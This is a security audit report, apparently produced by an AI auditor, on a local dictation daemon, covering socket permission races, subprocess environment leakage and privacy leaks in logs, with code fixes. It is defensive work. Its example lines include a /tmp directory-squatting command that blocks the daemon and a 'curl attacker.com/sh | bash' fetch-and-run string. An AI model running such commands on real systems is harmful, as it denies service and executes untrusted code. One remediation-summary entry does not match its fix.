# Paulie — Security Audit

**Date:** 2026-04-12  
**Auditor:** Claude Sonnet 4.6 (Principal Engineer / Security Auditor role)  
**Scope:** Full source audit of `src/paulie/` — architecture, concurrency, IPC, subprocess usage, filesystem security, privacy, and supply-chain risk.  
**Status:** All findings below have been remediated in the same session. Each entry records the original vulnerability, its impact, and the fix applied.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Threat Model](#threat-model)
3. [Findings](#findings)
   - [SEC-01 — CRITICAL: TOCTOU on Socket Permissions](#sec-01--critical-toctou-on-socket-permissions)
   - [SEC-02 — HIGH: Socket in World-Writable `/tmp`](#sec-02--high-socket-in-world-writable-tmp)
   - [SEC-03 — HIGH: `IsADirectoryError` Crashes Daemon on Startup](#sec-03--high-isadirectoryerror-crashes-daemon-on-startup)
   - [SEC-04 — HIGH: Full Process Environment Inherited by `ydotool`](#sec-04--high-full-process-environment-inherited-by-ydotool)
   - [SEC-05 — MEDIUM: Wrong Default `ydotool` Socket Path](#sec-05--medium-wrong-default-ydotool-socket-path)
   - [SEC-06 — MEDIUM: `window_id` from External Process Not Validated](#sec-06--medium-window_id-from-external-process-not-validated)
   - [SEC-07 — MEDIUM: Full Transcription Logged at `INFO` Level](#sec-07--medium-full-transcription-logged-at-info-level)
   - [SEC-08 — MEDIUM: Active Window Name Logged at `INFO` Level](#sec-08--medium-active-window-name-logged-at-info-level)
   - [SEC-09 — LOW: `sys.exit()` in SIGTERM Handler Is Not Async-Signal-Safe](#sec-09--low-sysexit-in-sigterm-handler-is-not-async-signal-safe)
   - [SEC-10 — INFORMATIONAL: Acoustic Injection Attack Surface](#sec-10--informational-acoustic-injection-attack-surface)
4. [Findings Not Applicable](#findings-not-applicable)
5. [Remediation Summary](#remediation-summary)

---

## Executive Summary

Paulie is a local, offline, single-user speech-to-text daemon. Its attack surface is narrow by design: it has no network exposure, no root privileges, and no persistent storage of audio. All IPC is over a Unix domain socket scoped to the owning user's UID.

The audit identified **two high-severity pre-authentication issues** that could allow a local adversary to either silently prevent the daemon from starting (DoS) or, in a worst-case TOCTOU window, connect to the socket before permissions are set. It also identified **a high-severity subprocess environment issue** where `ydotool` inherited the full process environment, creating a vector for `LD_PRELOAD`-based library injection into the keystroke injection tool. Additionally, several medium-severity privacy leaks were found where sensitive content (transcription text, active window titles) were being written to the systemd journal at the default log level.

All nine code-level findings were remediated. SEC-10 (acoustic injection) is a design-level constraint with no complete code-level fix.

---

## Threat Model

| Actor | Capability | In Scope? |
|---|---|---|
| Remote attacker | Network access only | No — no network listener |
| Another local user (different UID) | Can read world-readable files in `/tmp`, create files in `/tmp` | Yes — SEC-02, SEC-03 |
| Compromised user-space process (same UID) | Can connect to the IPC socket, read env vars, play audio | Yes — SEC-04, SEC-10 |
| Malicious Python package / supply chain | Code runs as the user at import time | Partial — SEC-04 mitigates `LD_PRELOAD` propagation |
| Physical attacker with audio playback | Can inject audio into the default input device | Yes — SEC-10 (design constraint) |

---

## Findings

---

### SEC-01 — CRITICAL: TOCTOU on Socket Permissions

**File:** `daemon.py`  
**Status:** Remediated

#### Description

```python
# Before fix
self._sock.bind(SOCKET_PATH)
os.chmod(SOCKET_PATH, 0o600)   # socket exists as world-accessible until this line
```

Between `bind()` creating the socket inode and `chmod()` restricting it, the socket exists with the permissions dictated by the process `umask`. If the umask is permissive (e.g. `0000`, which any parent process can set), the socket is world-accessible for the duration of this window — long enough for a fast local process to `connect()` and trigger a microphone-recording and keystroke-injection cycle as the victim user.

#### Impact

- Any local user (or same-user process with a permissive environment) could trigger the daemon's record→transcribe→inject pipeline without the user's knowledge.
- On a multi-user workstation this constitutes unauthorised microphone access.

#### Fix Applied

```python
# After fix — daemon.py
old_umask = os.umask(0o177)   # 0777 - 0177 = 0600, applied atomically at inode creation
try:
    self._sock.bind(SOCKET_PATH)
finally:
    os.umask(old_umask)
os.chmod(SOCKET_PATH, 0o600)  # belt-and-suspenders for filesystems ignoring umask
```

The socket is now created at `0600` in a single kernel call — no race window.

---

### SEC-02 — HIGH: Socket in World-Writable `/tmp`

**File:** `daemon.py`, `main.py`  
**Status:** Remediated

#### Description

```python
# Before fix
SOCKET_PATH = f"/tmp/paulie-{os.getuid()}.sock"
```

`/tmp` is `1777` (world-writable with sticky bit). The sticky bit prevents other users from *deleting* the socket once it exists, but it does **not** prevent them from creating files or directories there *before* the daemon starts. A local adversary can permanently block the daemon from starting:

```bash
# Run once as any local user — daemon can never start afterwards
mkdir /tmp/paulie-1000.sock
```

When the daemon starts, `os.unlink()` raises `IsADirectoryError` (uncaught at the time — see SEC-03), the daemon crashes, and the socket path is permanently blocked for the lifetime of the `/tmp` filesystem.

#### Impact

- Permanent pre-authentication local DoS. No privileges required.
- The hotkey becomes non-functional; the user has no visible error.

#### Fix Applied

`SOCKET_PATH` now prefers `$XDG_RUNTIME_DIR` (`/run/user/<uid>`, mode `0700`, created and managed by `systemd-logind`):

```python
# After fix — daemon.py and main.py (must be identical in both)
SOCKET_PATH = os.path.join(
    os.environ.get("XDG_RUNTIME_DIR") or "/tmp",
    f"paulie-{os.getuid()}.sock",
)
```

`XDG_RUNTIME_DIR` is owned exclusively by the user, mode `0700`. A different local user cannot list it, create files inside it, or connect to sockets within it. The `/tmp` path is kept as a fallback for non-systemd environments.

---

### SEC-03 — HIGH: `IsADirectoryError` Crashes Daemon on Startup

**File:** `daemon.py`  
**Status:** Remediated

#### Description

```python
# Before fix
try:
    os.unlink(SOCKET_PATH)
except FileNotFoundError:
    pass       # IsADirectoryError, PermissionError, and all other OSErrors propagate
```

`os.unlink()` on a path that is a directory raises `IsADirectoryError` (`OSError` subclass, errno `EISDIR`). Only `FileNotFoundError` (`ENOENT`) was caught, so the squatted-directory DoS from SEC-02 — or any other filesystem anomaly — caused an unhandled exception that crashed the daemon before it could bind. Even after moving to `XDG_RUNTIME_DIR` (which prevents the squatting), defensive handling here ensures unexpected filesystem states produce a clear log message rather than a crash.

#### Fix Applied

```python
# After fix — daemon.py
try:
    os.unlink(SOCKET_PATH)
except FileNotFoundError:
    pass
except OSError as exc:
    logger.warning("Could not remove stale socket path %s: %s", SOCKET_PATH, exc)
    # bind() below will surface the real error with a clear message
```

---

### SEC-04 — HIGH: Full Process Environment Inherited by `ydotool`

**File:** `inject.py`  
**Status:** Remediated

#### Description

```python
# Before fix
env = os.environ.copy()
...
subprocess.run(["ydotool", "type", "--", text], ..., env=env)
```

The entire daemon environment was forwarded to the `ydotool` child process, including:

- `LD_PRELOAD` — allows injecting an arbitrary shared library into `ydotool`
- `PYTHONPATH` / `PYTHONSTARTUP` — Python interpreter hooks (not directly relevant to `ydotool` but indicative of the pattern)
- `LD_LIBRARY_PATH` — redirects dynamic linker resolution
- Any secret tokens or credentials set in the user's shell profile

If a compromised package or `.bashrc` entry set `LD_PRELOAD=/path/to/evil.so`, that library would be loaded into `ydotool` — the process that has write access to `/dev/uinput` and can inject arbitrary keystrokes into any application.

#### Impact

- A compromised user-space package or shell configuration can hijack the keystroke injection process.
- `ydotool` runs with elevated group access to `/dev/uinput`; library injection here is more dangerous than into the daemon itself.

#### Fix Applied

```python
# After fix — inject.py
env: dict[str, str] = {
    "PATH":            os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
    "HOME":            os.environ.get("HOME", ""),
    "XDG_RUNTIME_DIR": xdg,
    "WAYLAND_DISPLAY": os.environ.get("WAYLAND_DISPLAY", ""),
    "DISPLAY":         os.environ.get("DISPLAY", ""),
    "YDOTOOL_SOCKET":  ydotool_socket,
}
```

Only the six variables `ydotool` actually needs are passed. `LD_PRELOAD` and all other inherited variables are excluded by construction.

---

### SEC-05 — MEDIUM: Wrong Default `ydotool` Socket Path

**File:** `inject.py`  
**Status:** Remediated

#### Description

```python
# Before fix
if "YDOTOOL_SOCKET" not in env:
    env["YDOTOOL_SOCKET"] = os.path.join(os.path.expanduser("~"), ".ydotool_socket")
```

On Bazzite and Fedora-based systems, `ydotoold` runs as a systemd user service and places its socket at `$XDG_RUNTIME_DIR/ydotool_socket` (e.g. `/run/user/1000/ydotool_socket`). The previous fallback pointed to `~/.ydotool_socket` — a path `ydotoold` never creates in this configuration — causing `ydotool` to silently fail to connect to its daemon.

#### Fix Applied

Rather than hardcoding a priority that may not match the local `ydotoold` configuration, the code probes all known socket locations in order and uses the first that exists on disk:

```python
# After fix — inject.py
_candidates = [
    os.environ.get("YDOTOOL_SOCKET", ""),          # explicit override
    os.path.join(os.path.expanduser("~"), ".ydotool_socket"),  # KDE Autostart default
    os.path.join(xdg, "ydotool_socket") if xdg else "",        # systemd user service
    "/tmp/.ydotool_socket",                         # legacy fallback
]
ydotool_socket = next(
    (p for p in _candidates if p and os.path.exists(p)),
    _candidates[1],   # default guess if none found
)
```

This is robust across different `ydotoold` launch configurations (KDE Autostart, systemd user service, manual).

---

### SEC-06 — MEDIUM: `window_id` from External Process Not Validated

**File:** `inject.py`  
**Status:** Remediated

#### Description

```python
# Before fix
method, _, window_id = token.partition(":")
subprocess.run(["xdotool", "windowactivate", "--sync", window_id], ...)
```

`window_id` was taken verbatim from the stdout of `xdotool getactivewindow` or `qdbus activeClient` and passed directly to a second subprocess call with no validation. Because `shell=False` was used throughout, there was no shell injection risk. However, unexpected subprocess output (empty string, multi-line output, leading dashes that could be interpreted as flags by a future code path) could produce confusing or erroneous behaviour.

#### Fix Applied

```python
# After fix — inject.py
if method == "xdotool":
    if not window_id.isdigit():
        logger.warning("restore_focus: unexpected xdotool window ID %r — skipping", window_id)
        return
elif method == "kwin":
    if not re.fullmatch(r"[0-9A-Fa-f\-]+", window_id):
        logger.warning("restore_focus: unexpected KWin client ID %r — skipping", window_id)
        return
```

xdotool window IDs are decimal integers. KWin client IDs are hex UUIDs. Anything else is rejected before reaching a subprocess.

---

### SEC-07 — MEDIUM: Full Transcription Logged at `INFO` Level

**File:** `daemon.py`  
**Status:** Remediated

#### Description

```python
# Before fix
logger.info("Transcription: %r", text)
```

On systemd-based systems, `INFO`-level log output from user services is captured by `journald` and persists across reboots. It is readable by the user with `journalctl --user` and by administrators with `journalctl`. If the user dictates sensitive content (a confidential memo, credentials spoken aloud, medical or legal information), the full text persists in the system journal indefinitely.

#### Fix Applied

```python
# After fix — daemon.py
logger.debug("Transcription: %r", text)          # full content at DEBUG only
logger.info("Transcription complete (%d chars).", len(text))  # metadata only at INFO
```

The content is invisible at the default `INFO` log level and not captured by journald in normal operation.

---

### SEC-08 — MEDIUM: Active Window Name Logged at `INFO` Level

**File:** `inject.py`  
**Status:** Remediated

#### Description

```python
# Before fix
logger.info("save_focus: xdotool captured window %s (%s)", wid, name)
```

The active window title is one of the most sensitive pieces of metadata on a desktop system. Examples of titles that would appear in the journal: `"1Password — Personal Vault"`, `"Signal — Private conversation with Alice"`, `"sudo — root@hostname"`. This information persists in the systemd journal and is accessible to system administrators.

#### Fix Applied

```python
# After fix — inject.py
logger.debug("save_focus: xdotool captured window %s (%s)", wid, name)
```

Window titles are now only visible when the user explicitly enables `DEBUG`-level logging.

---

### SEC-09 — LOW: `sys.exit()` in SIGTERM Handler Is Not Async-Signal-Safe

**File:** `daemon.py`  
**Status:** Remediated

#### Description

```python
# Before fix
signal.signal(signal.SIGTERM, lambda *_: sys.exit(0))
```

POSIX defines a limited set of async-signal-safe functions. `sys.exit()` is not among them — it raises `SystemExit`, which unwinds Python's exception machinery and invokes `atexit` handlers from within the signal handler context. In CPython this works in practice due to GIL serialisation, but it can produce deadlocks when a SIGTERM arrives while a C extension (PyTorch, ONNX Runtime, PortAudio) holds the GIL or a low-level mutex.

#### Fix Applied

```python
# After fix — daemon.py
signal.signal(signal.SIGTERM, lambda *_: QApplication.instance().quit())
```

`QApplication.quit()` posts a deferred quit to the Qt event loop and returns immediately. The actual shutdown is processed on the next event loop iteration in the main thread — no exception machinery is invoked from the signal handler.

---

### SEC-10 — INFORMATIONAL: Acoustic Injection Attack Surface

**File:** N/A (design-level)  
**Status:** Not fully mitigable at the application layer — documented for operator awareness.

#### Description

Because `ydotool type` injects text into whatever window holds keyboard focus — including terminals, browser address bars, password managers, and `sudo` prompts — the following attack chain is theoretically viable against a user whose session is compromised:

1. A malicious process (same UID) connects to the Paulie socket to trigger the pipeline.
2. The same process plays crafted audio to the default PipeWire/PulseAudio source via a loopback device.
3. Parakeet transcribes the crafted audio to a chosen string (e.g. `; curl attacker.com/sh | bash ;`).
4. `ydotool` injects that string into a focused terminal window.

This is not a code vulnerability — it is an inherent property of any local dictation tool that uses kernel-level input injection. The attack requires the adversary to already have code execution as the user (step 1 and 2 both require same-UID access), at which point far simpler injection paths exist.

#### Existing Mitigations

- Physical hotkey required to trigger the pipeline (not triggerable by audio alone without socket access)
- `threading.Event` prevents concurrent pipeline execution — only one injection can be in-flight at a time
- `ydotool` requires the user to be in the `input` group — not universally granted

#### Residual Risk

Users should be aware that triggering Paulie with a terminal or `sudo` prompt focused carries inherent risk. Consider binding the hotkey to a key combination that is hard to trigger accidentally.

---

## Findings Not Applicable

The following potential vulnerability classes were investigated and found **not present**:

| Class | Verdict |
|---|---|
| Shell injection via `subprocess` | All subprocess calls use list form (`shell=False`). The `--` sentinel in `ydotool type -- <text>` prevents flag injection from transcribed text. |
| Path traversal in socket path | `os.getuid()` returns an integer — cannot contain `/` or `..`. |
| SQL / template injection | No database, no templating engine. |
| ONNX model path traversal | `MODEL_NAME` is a hardcoded string constant, not user-supplied. |
| PyTorch pickle deserialization of untrusted data | Model is loaded from the `silero-vad` PyPI package or `torch.hub` (GitHub). Trusted source; no user-controlled deserialization path. |
| Network exposure | No network sockets opened anywhere in the codebase. |

---

## Remediation Summary

| ID | Severity | File(s) | Finding | Status |
|---|---|---|---|---|
| SEC-01 | Critical | `daemon.py` | TOCTOU between `bind()` and `chmod()` | Fixed — `os.umask(0o177)` wraps `bind()` |
| SEC-02 | High | `daemon.py`, `main.py` | Socket in world-writable `/tmp` | Fixed — prefer `$XDG_RUNTIME_DIR` |
| SEC-03 | High | `daemon.py` | `IsADirectoryError` not caught on unlink | Fixed — catch broad `OSError` |
| SEC-04 | High | `inject.py` | Full env inherited by `ydotool` subprocess | Fixed — explicit minimal env dict |
| SEC-05 | Medium | `inject.py` | Wrong default `ydotool` socket path | Fixed — prefer `$XDG_RUNTIME_DIR/ydotool_socket` |
| SEC-06 | Medium | `inject.py` | `window_id` not validated before subprocess | Fixed — `isdigit()` / `re.fullmatch` guards |
| SEC-07 | Medium | `daemon.py` | Transcription text in journald at INFO | Fixed — moved to `DEBUG` |
| SEC-08 | Medium | `inject.py` | Window title in journald at INFO | Fixed — moved to `DEBUG` |
| SEC-09 | Low | `daemon.py` | `sys.exit()` in signal handler | Fixed — `QApplication.quit()` |
| SEC-10 | Info | Design | Acoustic injection attack surface | Documented — not fully mitigable |
